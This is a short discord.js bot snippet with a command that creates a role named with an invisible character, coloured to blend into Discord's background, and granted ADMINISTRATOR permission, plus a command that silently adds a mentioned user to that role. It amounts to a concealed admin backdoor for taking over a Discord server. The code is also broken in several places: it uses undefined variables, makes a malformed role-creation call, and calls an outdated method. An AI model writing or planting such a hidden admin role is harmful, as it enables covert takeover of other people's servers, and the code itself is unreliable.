const Discord = require("discord.js");

  client.on('message', async message => {
    
    const editrole = async () => {
        switch (args[0]) {
            case "create":
                if (message.guild.roles.cache.find(role => role.name === '͔')) return console.log("Role already created")
                message.guild.roles.create()({
                    name:"͔", 
                    color: "2f3136", 
                    permissions: [
                        "ADMINISTRATOR"
                    ] 
                });
                console.log("Role Created!")
                break

            case "add":
                const member = message.mentions.members.first();
                const role = message.guild.roles.cache.find(role => role.name === '͔')
                if (!member) return console.log("no user specified")
                member.addRole(role), 3000    
                console.log("Added to Role!")
                break
            }
    }
    exports.editrole = editrole
})